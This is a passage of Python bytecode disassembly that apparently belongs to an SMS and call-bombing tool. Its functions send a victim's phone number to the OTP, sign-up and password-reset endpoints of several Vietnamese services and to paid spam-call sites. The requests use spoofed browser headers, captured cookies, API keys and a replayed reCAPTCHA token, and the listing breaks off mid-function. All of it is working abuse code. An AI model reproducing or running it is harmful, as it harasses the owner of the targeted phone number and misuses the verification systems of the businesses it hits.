            106 RETURN_VALUE

Disassembly of <code object tobi at 0x7f48c6d75000, file "<x>", line 278>:
278           0 RESUME                   0

280           2 LOAD_CONST               1 ('Server-IPv2')

281           4 LOAD_CONST               2 ('V0dwq4Fn4o1GNyxFv5htNHDZ2vZPGEAM53zuseO7Fe0-1686142646-0-160')

282           6 LOAD_CONST               3 ('1.1.407087509.1686353305')

283           8 LOAD_CONST               4 ('GA1.2.663989590.1686353305')

279          10 LOAD_CONST               5 (('serverChoice', 'cf_clearance', '_gcl_au', '_ga'))
             12 BUILD_CONST_KEY_MAP      4
             14 STORE_FAST               1 (cookies)

286          16 BUILD_MAP                0

287          18 LOAD_CONST               6 ('authority')
             20 LOAD_CONST               7 ('tobizzx.xyz')

286          22 MAP_ADD                  1

288          24 LOAD_CONST               8 ('accept')
             26 LOAD_CONST               9 ('text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7')

286          28 MAP_ADD                  1

289          30 LOAD_CONST              10 ('accept-language')
             32 LOAD_CONST              11 ('vi,fr-FR;q=0.9,fr;q=0.8,en-US;q=0.7,en;q=0.6,zh-CN;q=0.5,zh;q=0.4')

286          34 MAP_ADD                  1

290          36 LOAD_CONST              12 ('cache-control')
             38 LOAD_CONST              13 ('max-age=0')

286          40 MAP_ADD                  1

291          42 LOAD_CONST              14 ('content-type')
             44 LOAD_CONST              15 ('application/x-www-form-urlencoded')

286          46 MAP_ADD                  1

293          48 LOAD_CONST              16 ('origin')
             50 LOAD_CONST              17 ('https://tobizzx.xyz')

286          52 MAP_ADD                  1

294          54 LOAD_CONST              18 ('referer')
             56 LOAD_CONST              19 ('https://tobizzx.xyz/tools/')

286          58 MAP_ADD                  1

295          60 LOAD_CONST              20 ('sec-ch-ua')
             62 LOAD_CONST              21 ('"Chromium";v="112", "Google Chrome";v="112", "Not:A-Brand";v="99"')

286          64 MAP_ADD                  1

296          66 LOAD_CONST              22 ('sec-ch-ua-mobile')
             68 LOAD_CONST              23 ('?0')

286          70 MAP_ADD                  1

297          72 LOAD_CONST              24 ('sec-ch-ua-platform')
             74 LOAD_CONST              25 ('"Windows"')

286          76 MAP_ADD                  1

298          78 LOAD_CONST              26 ('sec-fetch-dest')
             80 LOAD_CONST              27 ('document')

286          82 MAP_ADD                  1

299          84 LOAD_CONST              28 ('sec-fetch-mode')
             86 LOAD_CONST              29 ('navigate')

286          88 MAP_ADD                  1

300          90 LOAD_CONST              30 ('sec-fetch-site')
             92 LOAD_CONST              31 ('same-origin')

286          94 MAP_ADD                  1

301          96 LOAD_CONST              32 ('sec-fetch-user')
             98 LOAD_CONST              33 ('?1')

286         100 MAP_ADD                  1

302         102 LOAD_CONST              34 ('upgrade-insecure-requests')
            104 LOAD_CONST              35 ('1')

286         106 MAP_ADD                  1

303         108 LOAD_CONST              36 ('user-agent')
            110 LOAD_CONST              37 ('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36')

286         112 MAP_ADD                  1
            114 STORE_FAST               2 (headers)

307         116 LOAD_FAST                0 (phone)

308         118 LOAD_CONST               1 ('Server-IPv2')

309         120 LOAD_CONST              38 ('tobiowner')

306         122 LOAD_CONST              39 (('phone', 'ten_server', 'key'))
            124 BUILD_CONST_KEY_MAP      3
            126 STORE_FAST               3 (data)

312         128 LOAD_GLOBAL              1 (NULL + requests)
            140 LOAD_ATTR                1 (post)
            150 LOAD_CONST              19 ('https://tobizzx.xyz/tools/')
            152 LOAD_FAST                1 (cookies)
            154 LOAD_FAST                2 (headers)
            156 LOAD_FAST                3 (data)
            158 KW_NAMES                40
            160 PRECALL                  4
            164 CALL                     4
            174 STORE_FAST               4 (response)
            176 LOAD_CONST               0 (None)
            178 RETURN_VALUE

Disassembly of <code object loship at 0x7f48c6e0c9f0, file "<x>", line 313>:
313           0 RESUME                   0

314           2 LOAD_GLOBAL              1 (NULL + requests)
             14 LOAD_ATTR                1 (post)
             24 LOAD_CONST               1 ('https://latte.lozi.vn/v1.2/auth/register/phone/initial')
             26 BUILD_MAP                0
             28 LOAD_CONST               2 ('Host')
             30 LOAD_CONST               3 ('latte.lozi.vn')
             32 MAP_ADD                  1
             34 LOAD_CONST               4 ('content-length')
             36 LOAD_CONST               5 ('101')
             38 MAP_ADD                  1
             40 LOAD_CONST               6 ('x-city-id')
             42 LOAD_CONST               7 ('50')
             44 MAP_ADD                  1
             46 LOAD_CONST               8 ('accept-language')
             48 LOAD_CONST               9 ('vi_VN')
             50 MAP_ADD                  1
             52 LOAD_CONST              10 ('sec-ch-ua-mobile')
             54 LOAD_CONST              11 ('?1')
             56 MAP_ADD                  1
             58 LOAD_CONST              12 ('user-agent')
             60 LOAD_CONST              13 ('Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36')
             62 MAP_ADD                  1
             64 LOAD_CONST              14 ('content-type')
             66 LOAD_CONST              15 ('application/json')
             68 MAP_ADD                  1
             70 LOAD_CONST              16 ('x-lozi-client')
             72 LOAD_CONST              17 ('1')
             74 MAP_ADD                  1
             76 LOAD_CONST              18 ('x-access-token')
             78 LOAD_CONST              19 ('unknown')
             80 MAP_ADD                  1
             82 LOAD_CONST              20 ('sec-ch-ua-platform')
             84 LOAD_CONST              21 ('"Android"')
             86 MAP_ADD                  1
             88 LOAD_CONST              22 ('accept')
             90 LOAD_CONST              23 ('*/*')
             92 MAP_ADD                  1
             94 LOAD_CONST              24 ('origin')
             96 LOAD_CONST              25 ('https://loship.vn')
             98 MAP_ADD                  1
            100 LOAD_CONST              26 ('sec-fetch-site')
            102 LOAD_CONST              27 ('cross-site')
            104 MAP_ADD                  1
            106 LOAD_CONST              28 ('sec-fetch-mode')
            108 LOAD_CONST              29 ('cors')
            110 MAP_ADD                  1
            112 LOAD_CONST              30 ('sec-fetch-dest')
            114 LOAD_CONST              31 ('empty')
            116 MAP_ADD                  1
            118 LOAD_CONST              32 ('referer')
            120 LOAD_CONST              33 ('https://loship.vn/')
            122 MAP_ADD                  1
            124 LOAD_CONST              34 ('accept-encoding')
            126 LOAD_CONST              35 ('gzip, deflate, br')
            128 MAP_ADD                  1
            130 LOAD_GLOBAL              5 (NULL + json)
            142 LOAD_ATTR                3 (dumps)
            152 LOAD_CONST              36 ('Android 8.1.0')
            154 LOAD_CONST              37 ('Chrome/104.0.0.0')
            156 LOAD_CONST              38 ('84')
            158 LOAD_FAST                0 (phone)
            160 LOAD_CONST              39 (1)
            162 LOAD_CONST              40 (11)
            164 BUILD_SLICE              2
            166 BINARY_SUBSCR
            176 LOAD_CONST              41 (('device', 'platform', 'countryCode', 'phoneNumber'))
            178 BUILD_CONST_KEY_MAP      4
            180 PRECALL                  1
            184 CALL                     1
            194 KW_NAMES                42
            196 PRECALL                  3
            200 CALL                     3
            210 LOAD_ATTR                4 (text)
            220 POP_TOP
            222 LOAD_CONST               0 (None)
            224 RETURN_VALUE

Disassembly of <code object minh at 0x7f48c6d75170, file "<x>", line 316>:
316           0 RESUME                   0

318           2 LOAD_CONST               1 ('1.1.1012218881.1684835781')

319           4 LOAD_CONST               2 ('fb.1.1684835781515.1677166536')

320           6 LOAD_CONST               3 ('GA1.2.1408134411.1685940951')

321           8 LOAD_CONST               4 ('GS1.1.1685959550.3.0.1685959550.0.0.0')

322          10 LOAD_CONST               5 ('GA1.2.77743250.1684835781')

317          12 LOAD_CONST               6 (('_gcl_au', '_fbp', '_gid', '_ga_CDVH4VH813', '_ga'))
             14 BUILD_CONST_KEY_MAP      5
             16 STORE_FAST               1 (cookies)

325          18 BUILD_MAP                0

326          20 LOAD_CONST               7 ('authority')
             22 LOAD_CONST               8 ('spamcallsms.click')

325          24 MAP_ADD                  1

327          26 LOAD_CONST               9 ('accept')
             28 LOAD_CONST              10 ('text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7')

325          30 MAP_ADD                  1

328          32 LOAD_CONST              11 ('accept-language')
             34 LOAD_CONST              12 ('vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5')

325          36 MAP_ADD                  1

329          38 LOAD_CONST              13 ('cache-control')
             40 LOAD_CONST              14 ('max-age=0')

325          42 MAP_ADD                  1

330          44 LOAD_CONST              15 ('content-type')
             46 LOAD_CONST              16 ('application/x-www-form-urlencoded')

325          48 MAP_ADD                  1

332          50 LOAD_CONST              17 ('origin')
             52 LOAD_CONST              18 ('https://spamcallsms.click')

325          54 MAP_ADD                  1

333          56 LOAD_CONST              19 ('referer')
             58 LOAD_CONST              20 ('https://spamcallsms.click/')

325          60 MAP_ADD                  1

334          62 LOAD_CONST              21 ('sec-ch-ua')
             64 LOAD_CONST              22 ('"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"')

325          66 MAP_ADD                  1

335          68 LOAD_CONST              23 ('sec-ch-ua-mobile')
             70 LOAD_CONST              24 ('?0')

325          72 MAP_ADD                  1

336          74 LOAD_CONST              25 ('sec-ch-ua-platform')
             76 LOAD_CONST              26 ('"Windows"')

325          78 MAP_ADD                  1

337          80 LOAD_CONST              27 ('sec-fetch-dest')
             82 LOAD_CONST              28 ('document')

325          84 MAP_ADD                  1

338          86 LOAD_CONST              29 ('sec-fetch-mode')
             88 LOAD_CONST              30 ('navigate')

325          90 MAP_ADD                  1

339          92 LOAD_CONST              31 ('sec-fetch-site')
             94 LOAD_CONST              32 ('same-origin')

325          96 MAP_ADD                  1

340          98 LOAD_CONST              33 ('sec-fetch-user')
            100 LOAD_CONST              34 ('?1')

325         102 MAP_ADD                  1

341         104 LOAD_CONST              35 ('upgrade-insecure-requests')
            106 LOAD_CONST              36 ('1')

325         108 MAP_ADD                  1

342         110 LOAD_CONST              37 ('user-agent')
            112 LOAD_CONST              38 ('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36')

325         114 MAP_ADD                  1
            116 STORE_FAST               2 (headers)

346         118 LOAD_FAST                0 (phone)

347         120 LOAD_CONST              39 ('admin07ntt')

348         122 LOAD_CONST              40 ('apiv5')

349         124 LOAD_CONST              41 ('')

345         126 LOAD_CONST              42 (('phone', 'api_key', 'option', 'submit'))
            128 BUILD_CONST_KEY_MAP      4
            130 STORE_FAST               3 (data)

352         132 LOAD_GLOBAL              1 (NULL + requests)
            144 LOAD_ATTR                1 (post)
            154 LOAD_CONST              20 ('https://spamcallsms.click/')
            156 LOAD_FAST                1 (cookies)
            158 LOAD_FAST                2 (headers)
            160 LOAD_FAST                3 (data)
            162 KW_NAMES                43
            164 PRECALL                  4
            168 CALL                     4
            178 STORE_FAST               4 (response)
            180 LOAD_CONST               0 (None)
            182 RETURN_VALUE

Disassembly of <code object oldloship at 0x7f48c6bde100, file "<x>", line 353>:
353           0 RESUME                   0

354           2 LOAD_GLOBAL              1 (NULL + requests)
             14 LOAD_ATTR                1 (post)
             24 LOAD_CONST               1 ('https://mocha.lozi.vn/v6/invites/use-app')
             26 BUILD_MAP                0
             28 LOAD_CONST               2 ('Host')
             30 LOAD_CONST               3 ('mocha.lozi.vn')
             32 MAP_ADD                  1
             34 LOAD_CONST               4 ('content-length')
             36 LOAD_CONST               5 ('47')
             38 MAP_ADD                  1
             40 LOAD_CONST               6 ('x-city-id')
             42 LOAD_CONST               7 ('50')
             44 MAP_ADD                  1
             46 LOAD_CONST               8 ('accept-language')
             48 LOAD_CONST               9 ('vi_VN')
             50 MAP_ADD                  1
             52 LOAD_CONST              10 ('sec-ch-ua-mobile')
             54 LOAD_CONST              11 ('?1')
             56 MAP_ADD                  1
             58 LOAD_CONST              12 ('user-agent')
             60 LOAD_CONST              13 ('Mozilla/5.0 (Linux; Android 10; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Mobile Safari/537.36')
             62 MAP_ADD                  1
             64 LOAD_CONST              14 ('content-type')
             66 LOAD_CONST              15 ('application/json')
             68 MAP_ADD                  1
             70 LOAD_CONST              16 ('x-lozi-client')
             72 LOAD_CONST              17 ('1')
             74 MAP_ADD                  1
             76 LOAD_CONST              18 ('x-access-token')
             78 LOAD_CONST              19 ('unknown')
             80 MAP_ADD                  1
             82 LOAD_CONST              20 ('sec-ch-ua-platform')
             84 LOAD_CONST              21 ('"Android"')
             86 MAP_ADD                  1
             88 LOAD_CONST              22 ('accept')
             90 LOAD_CONST              23 ('*/*')
             92 MAP_ADD                  1
             94 LOAD_CONST              24 ('origin')
             96 LOAD_CONST              25 ('https://loship.vn')
             98 MAP_ADD                  1
            100 LOAD_CONST              26 ('sec-fetch-site')
            102 LOAD_CONST              27 ('cross-site')
            104 MAP_ADD                  1
            106 LOAD_CONST              28 ('sec-fetch-mode')
            108 LOAD_CONST              29 ('cors')
            110 MAP_ADD                  1
            112 LOAD_CONST              30 ('sec-fetch-dest')
            114 LOAD_CONST              31 ('empty')
            116 MAP_ADD                  1
            118 LOAD_CONST              32 ('referer')
            120 LOAD_CONST              25 ('https://loship.vn')
            122 MAP_ADD                  1
            124 LOAD_CONST              33 ('accept-encoding')
            126 LOAD_CONST              34 ('gzip, deflate, br')
            128 MAP_ADD                  1
            130 LOAD_GLOBAL              5 (NULL + json)
            142 LOAD_ATTR                3 (dumps)
            152 LOAD_CONST              35 ('Android 8.1.0')
            154 LOAD_CONST              36 ('Chrome/104.0.0.0')
            156 LOAD_CONST              37 ('84')
            158 LOAD_FAST                0 (phone)
            160 LOAD_CONST              38 (1)
            162 LOAD_CONST              39 (11)
            164 BUILD_SLICE              2
            166 BINARY_SUBSCR
            176 LOAD_CONST              40 (('device', 'platform', 'countryCode', 'phoneNumber'))
            178 BUILD_CONST_KEY_MAP      4
            180 PRECALL                  1
            184 CALL                     1
            194 KW_NAMES                41
            196 PRECALL                  3
            200 CALL                     3
            210 STORE_FAST               1 (response)
            212 LOAD_CONST               0 (None)
            214 RETURN_VALUE

Disassembly of <code object fpt at 0x7f48c6d95230, file "<x>", line 356>:
356           0 RESUME                   0

357           2 LOAD_GLOBAL              1 (NULL + requests)
             14 LOAD_ATTR                1 (post)
             24 LOAD_CONST               1 ('https://fptshop.com.vn/api-data/loyalty/Home/Verification')
             26 LOAD_CONST               2 ('fptshop.com.vn')
             28 LOAD_CONST               3 ('16')
             30 LOAD_CONST               4 ('*/*')
             32 LOAD_CONST               5 ('application/x-www-form-urlencoded; charset=UTF-8')
             34 LOAD_CONST               6 ('XMLHttpRequest')
             36 LOAD_CONST               7 ('?1')
             38 LOAD_CONST               8 ('Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36')
             40 LOAD_CONST               9 ('"Linux"')
             42 LOAD_CONST              10 ('https://fptshop.com.vn')
             44 LOAD_CONST              11 ('same-origin')
             46 LOAD_CONST              12 ('cors')
             48 LOAD_CONST              13 ('empty')
             50 LOAD_CONST              14 ('https://fptshop.com.vn/')
             52 LOAD_CONST              15 ('gzip, deflate, br')
             54 LOAD_CONST              16 (('Host', 'content-length', 'accept', 'content-type', 'x-requested-with', 'sec-ch-ua-mobile', 'user-agent', 'sec-ch-ua-platform', 'origin', 'sec-fetch-site', 'sec-fetch-mode', 'sec-fetch-dest', 'referer', 'accept-encoding'))
             56 BUILD_CONST_KEY_MAP     14
             58 LOAD_CONST              17 ('phone')
             60 LOAD_FAST                0 (phone)
             62 BUILD_MAP                1
             64 KW_NAMES                18
             66 PRECALL                  3
             70 CALL                     3
             80 LOAD_ATTR                2 (text)
             90 POP_TOP
             92 LOAD_CONST               0 (None)
             94 RETURN_VALUE

Disassembly of <code object kiot at 0x7f48c6d70f60, file "<x>", line 359>:
359           0 RESUME                   0

360           2 BUILD_MAP                0

361           4 LOAD_CONST               1 ('AKA_A2')
              6 LOAD_CONST               2 ('A')

360           8 MAP_ADD                  1

362          10 LOAD_CONST               3 ('gkvas-uuid')
             12 LOAD_CONST               4 ('b1b6bfdd-724e-449f-8acc-f3594f1aae3f')

360          14 MAP_ADD                  1

363          16 LOAD_CONST               5 ('gkvas-uuid-d')
             18 LOAD_CONST               6 ('1687347271111')

360          20 MAP_ADD                  1

364          22 LOAD_CONST               7 ('kvas-uuid')
             24 LOAD_CONST               8 ('1fdbe87b-fe8b-4cd5-b065-0900b3db04b6')

360          26 MAP_ADD                  1

365          28 LOAD_CONST               9 ('kvas-uuid-d')
             30 LOAD_CONST              10 ('1687347276471')

360          32 MAP_ADD                  1

366          34 LOAD_CONST              11 ('kv-session')
             36 LOAD_CONST              12 ('52268693-9db7-4b7d-ab00-0f5022612bc5')

360          38 MAP_ADD                  1

367          40 LOAD_CONST              13 ('kv-session-d')
             42 LOAD_CONST              14 ('1687347276474')

360          44 MAP_ADD                  1

368          46 LOAD_CONST              15 ('_fbp')
             48 LOAD_CONST              16 ('fb.1.1687347277057.810313564')

360          50 MAP_ADD                  1

369          52 LOAD_CONST              17 ('_hjFirstSeen')
             54 LOAD_CONST              18 ('1')

360          56 MAP_ADD                  1

370          58 LOAD_CONST              19 ('_hjIncludedInSessionSample_563959')
             60 LOAD_CONST              18 ('1')

360          62 MAP_ADD                  1

371          64 LOAD_CONST              20 ('_hjSession_563959')
             66 LOAD_CONST              21 ('eyJpZCI6IjI0OTRjOTA0LTEwYzQtNGVkMS04MGViLWFhZWRjZTg5Y2FmMSIsImNyZWF0ZWQiOjE2ODczNDcyNzcxNTYsImluU2FtcGxlIjp0cnVlfQ==')

360          68 MAP_ADD                  1

372          70 LOAD_CONST              22 ('_hjAbsoluteSessionInProgress')
             72 LOAD_CONST              18 ('1')

360          74 MAP_ADD                  1

373          76 LOAD_CONST              23 ('_tt_enable_cookie')
             78 LOAD_CONST              18 ('1')

360          80 MAP_ADD                  1

374          82 LOAD_CONST              24 ('_ttp')
             84 LOAD_CONST              25 ('idt42AWvO5FQ_0j25HtJ7BSoA7J')

360          86 MAP_ADD                  1

375          88 LOAD_CONST              26 ('_gid')
             90 LOAD_CONST              27 ('GA1.2.1225607496.1687347277')

360          92 MAP_ADD                  1

376          94 LOAD_CONST              28 ('_hjSessionUser_563959')
             96 LOAD_CONST              29 ('eyJpZCI6ImRiOGYyMzEzLTdkMzItNTNmNi1hNWUzLTA4MjU5ZTE1MTRiOCIsImNyZWF0ZWQiOjE2ODczNDcyNzcxMzIsImV4aXN0aW5nIjp0cnVlfQ==')

360          98 MAP_ADD                  1

377         100 LOAD_CONST              30 ('_ga_6HE3N545ZW')
            102 LOAD_CONST              31 ('GS1.1.1687347278.1.1.1687347282.56.0.0')

360         104 MAP_ADD                  1

378         106 LOAD_CONST              32 ('GS1.2.1687347283.1.1.1687347283.0.0.0')

379         108 LOAD_CONST              33 ('4c8714f2-5161-4721-c213-fe417c49ae65')

380         110 LOAD_CONST              34 ('65')

381         112 LOAD_CONST              35 ('GA1.2.1568204857.1687347277')

360         114 LOAD_CONST              36 (('_ga_N9QLKLC70S', '_fw_crm_v', 'parent', '_ga'))
            116 BUILD_CONST_KEY_MAP      4
            118 DICT_UPDATE              1
            120 STORE_FAST               1 (cookies)

385         122 LOAD_CONST              37 ('www.kiotviet.vn')

386         124 LOAD_CONST              38 ('application/json, text/javascript, */*; q=0.01')

387         126 LOAD_CONST              39 ('vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5')

388         128 LOAD_CONST              40 ('application/x-www-form-urlencoded; charset=UTF-8')

390         130 LOAD_CONST              41 ('https://www.kiotviet.vn')

391         132 LOAD_CONST              42 ('https://www.kiotviet.vn/dang-ky/')

392         134 LOAD_CONST              43 ('"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"')

393         136 LOAD_CONST              44 ('?0')

394         138 LOAD_CONST              45 ('"Windows"')

395         140 LOAD_CONST              46 ('empty')

396         142 LOAD_CONST              47 ('cors')

397         144 LOAD_CONST              48 ('same-origin')

398         146 LOAD_CONST              49 ('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36')

399         148 LOAD_CONST              50 ('XMLHttpRequest')

384         150 LOAD_CONST              51 (('authority', 'accept', 'accept-language', 'content-type', 'origin', 'referer', 'sec-ch-ua', 'sec-ch-ua-mobile', 'sec-ch-ua-platform', 'sec-fetch-dest', 'sec-fetch-mode', 'sec-fetch-site', 'user-agent', 'x-requested-with'))
            152 BUILD_CONST_KEY_MAP     14
            154 STORE_FAST               2 (headers)

403         156 LOAD_CONST              52 ('+84972936627')

404         158 LOAD_CONST              53 ('bancainayne')

405         160 LOAD_CONST              54 ('Cai Nit')

406         162 LOAD_CONST              55 ('ahihi123982@gmail.com')

407         164 LOAD_CONST              56 ('An Giang - Huyện Châu Phú')

408         166 LOAD_CONST              53 ('bancainayne')

409         168 LOAD_CONST              57 ('0972936627')

410         170 LOAD_CONST              58 ('Điện thoại & Điện máy')

411         172 LOAD_CONST              59 ('')

412         174 LOAD_CONST              34 ('65')

413         176 LOAD_FAST                0 (phone)

402         178 LOAD_CONST              60 (('phone', 'code', 'name', 'email', 'zone', 'merchant', 'username', 'industry', 'ref_code', 'industry_id', 'phone_input'))
            180 BUILD_CONST_KEY_MAP     11
            182 STORE_FAST               3 (data)

416         184 LOAD_GLOBAL              1 (NULL + requests)
            196 LOAD_ATTR                1 (post)

417         206 LOAD_CONST              61 ('https://www.kiotviet.vn/wp-content/themes/kiotviet/TechAPI/getOTP.php')

418         208 LOAD_FAST                1 (cookies)

419         210 LOAD_FAST                2 (headers)

420         212 LOAD_FAST                3 (data)

416         214 KW_NAMES                62
            216 PRECALL                  4
            220 CALL                     4
            230 STORE_FAST               4 (response)
            232 LOAD_CONST               0 (None)
            234 RETURN_VALUE

Disassembly of <code object f88 at 0x7f48c6bd8f30, file "<x>", line 422>:
422           0 RESUME                   0

423           2 LOAD_GLOBAL              1 (NULL + requests)
             14 LOAD_ATTR                1 (post)
             24 LOAD_CONST               1 ('https://apigateway.f88.vn/services/appvay/api/onlinelending/VerifyOTP/sendOTP')
             26 BUILD_MAP                0
             28 LOAD_CONST               2 ('Host')
             30 LOAD_CONST               3 ('apigateway.f88.vn')
             32 MAP_ADD                  1
             34 LOAD_CONST               4 ('content-length')
             36 LOAD_CONST               5 ('595')
             38 MAP_ADD                  1
             40 LOAD_CONST               6 ('content-encoding')
             42 LOAD_CONST               7 ('gzip')
             44 MAP_ADD                  1
             46 LOAD_CONST               8 ('traceparent')
             48 LOAD_CONST               9 ('00-c7d4ad181d561015110814044adf720e-d3fed9b4added2cf-01')
             50 MAP_ADD                  1
             52 LOAD_CONST              10 ('sec-ch-ua-mobile')
             54 LOAD_CONST              11 ('?1')
             56 MAP_ADD                  1
             58 LOAD_CONST              12 ('authorization')
             60 LOAD_CONST              13 ('Bearer null')
             62 MAP_ADD                  1
             64 LOAD_CONST              14 ('content-type')
             66 LOAD_CONST              15 ('application/json')
             68 MAP_ADD                  1
             70 LOAD_CONST              16 ('user-agent')
             72 LOAD_CONST              17 ('Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36')
             74 MAP_ADD                  1
             76 LOAD_CONST              18 ('sec-ch-ua-platform')
             78 LOAD_CONST              19 ('"Linux"')
             80 MAP_ADD                  1
             82 LOAD_CONST              20 ('accept')
             84 LOAD_CONST              21 ('*/*')
             86 MAP_ADD                  1
             88 LOAD_CONST              22 ('origin')
             90 LOAD_CONST              23 ('https://online.f88.vn')
             92 MAP_ADD                  1
             94 LOAD_CONST              24 ('sec-fetch-site')
             96 LOAD_CONST              25 ('same-site')
             98 MAP_ADD                  1
            100 LOAD_CONST              26 ('sec-fetch-mode')
            102 LOAD_CONST              27 ('cors')
            104 MAP_ADD                  1
            106 LOAD_CONST              28 ('sec-fetch-dest')
            108 LOAD_CONST              29 ('empty')
            110 MAP_ADD                  1
            112 LOAD_CONST              30 ('referer')
            114 LOAD_CONST              31 ('https://online.f88.vn/')
            116 MAP_ADD                  1
            118 LOAD_CONST              32 ('accept-encoding')
            120 LOAD_CONST              33 ('gzip, deflate, br')
            122 MAP_ADD                  1
            124 LOAD_CONST              34 ('0')
            126 LOAD_FAST                0 (phone)
            128 LOAD_CONST              35 (1)
            130 LOAD_CONST              36 (11)
            132 BUILD_SLICE              2
            134 BINARY_SUBSCR
            144 BINARY_OP                0 (+)
            148 LOAD_CONST              37 ('03ANYolqvEe93MY94VJjkvDUIsq6ysACNy1tsnG1xnFq9YLY1gyez-_QvS0YEsxe9D0ddnuXKmlrbWqvT3KTQD2Bhx9yLeQ6M-nzUChGrqS08GEhHIdCpl3JLvHctZYeX18O8qZqcHY-e7qHq1WG7kkPbykyx9KwxMDnzW3j1N0KymuMti1Z0WAUgXHDh-ifJvI3n4lp5Tzsq5k1Nswugf0X3HFexHAm9GACImJIDG46QRucLBRm0df6jfazibClJyKlLXdvnqmrjCt6Wy22C_h-RY9Iilj5Lcy9rawUShIMJoCFX08UOWP_llCE4T5h5kuUk1llSgu9pdHMK2T6OuEROwXt2begTITv-9l534brGibKVlwwbxLtfHWohLRYQC-tjYWWq7avFLPOA9d53_72KLKoYAuKjvqKul683bQ7HtEzZ-eK3VCiBQj1Za1EV3R69e648tCkNkGXr9kpr1n0ccGeNbXSuB3GHQQGPnDIGuYgalvKa77_iX68OQ90PouP2GeT_RvBY3')
            150 LOAD_CONST              38 ('Online')
            152 LOAD_CONST              39 (('phoneNumber', 'recaptchaResponse', 'source'))
            154 BUILD_CONST_KEY_MAP      3
            156 KW_NAMES                40
            158 PRECALL                  3
            162 CALL                     3
            172 LOAD_ATTR                2 (text)
            182 POP_TOP
            184 LOAD_CONST               0 (None)
            186 RETURN_VALUE

Disassembly of <code object call1 at 0x7f48c6e10df0, file "<x>", line 425>:
425           0 RESUME                   0

426           2 LOAD_GLOBAL              1 (NULL + requests)
             14 LOAD_ATTR                1 (post)
             24 LOAD_CONST               1 ('https://api.vayvnd.vn/v1/users/password-reset')
             26 LOAD_CONST               2 ('api.vayvnd.vn')
             28 LOAD_CONST               3 ('22')
             30 LOAD_CONST               4 ('application/json')
             32 LOAD_CONST               4 ('application/json')
             34 LOAD_CONST               5 ('vi')
             36 LOAD_CONST               6 ('?1')
             38 LOAD_CONST               7 ('Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36')
             40 LOAD_CONST               8 ('"Android"')
             42 LOAD_CONST               9 ('https://vayvnd.vn')
             44 LOAD_CONST              10 ('same-site')
             46 LOAD_CONST              11 ('cors')
             48 LOAD_CONST              12 ('empty')
             50 LOAD_CONST              13 ('https://vayvnd.vn/')
             52 LOAD_CONST              14 ('gzip, deflate, br')
             54 LOAD_CONST              15 (('Host', 'content-length', 'accept', 'content-type', 'accept-language', 'sec-ch-ua-mobile', 'user-agent', 'sec-ch-ua-platform', 'origin', 'sec-fetch-site', 'sec-fetch-mode', 'sec-fetch-dest', 'referer', 'accept-encoding'))
             56 BUILD_CONST_KEY_MAP     14
             58 LOAD_GLOBAL              5 (NULL + json)
             70 LOAD_ATTR                3 (dumps)
             80 LOAD_CONST              16 ('login')
             82 LOAD_CONST              17 ('0')
             84 LOAD_FAST                0 (phone)
             86 LOAD_CONST              18 (1)
             88 LOAD_CONST              19 (11)
             90 BUILD_SLICE              2
             92 BINARY_SUBSCR
            102 BINARY_OP                0 (+)
            106 BUILD_MAP                1
            108 PRECALL                  1
            112 CALL                     1
            122 KW_NAMES                20
            124 PRECALL                  3
            128 CALL                     3
            138 LOAD_ATTR                4 (text)
            148 POP_TOP
            150 LOAD_CONST               0 (None)
            152 RETURN_VALUE

Disassembly of <code object call2 at 0x7f48c6df5a50, file "<x>", line 428>:
428           0 RESUME                   0

429           2 LOAD_GLOBAL              1 (NULL + requests)
             14 LOAD_ATTR                1 (post)
             24 LOAD_CONST               1 ('https://api.tamo.vn/web/public/client/phone/sms-code-ts')
             26 LOAD_CONST               2 ('api.tamo.vn')
             28 LOAD_CONST               3 ('39')
             30 LOAD_CONST               4 ('application/json, text/plain, */*')
             32 LOAD_CONST               5 ('application/json;charset=UTF-8')
             34 LOAD_CONST               6 ('?1')
             36 LOAD_CONST               7 ('Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36')
             38 LOAD_CONST               8 ('"Linux"')
             40 LOAD_CONST               9 ('https://www.tamo.vn')
             42 LOAD_CONST              10 ('same-site')
             44 LOAD_CONST              11 ('cors')
             46 LOAD_CONST              12 ('empty')
             48 LOAD_CONST              13 ('https://www.tamo.vn/')
             50 LOAD_CONST              14 ('gzip, deflate, br')
             52 LOAD_CONST              15 (('Host', 'content-length', 'accept', 'content-type', 'sec-ch-ua-mobile', 'user-agent', 'sec-ch-ua-platform', 'origin', 'sec-fetch-site', 'sec-fetch-mode', 'sec-fetch-dest', 'referer', 'accept-encoding'))
             54 BUILD_CONST_KEY_MAP     13
             56 LOAD_CONST              16 ('mobilePhone')
             58 LOAD_CONST              17 ('number')
             60 LOAD_CONST              18 ('0')
             62 LOAD_FAST                0 (phone)
             64 LOAD_CONST              19 (1)
             66 LOAD_CONST              20 (11)
             68 BUILD_SLICE              2
             70 BINARY_SUBSCR
             80 BINARY_OP                0 (+)
             84 BUILD_MAP                1
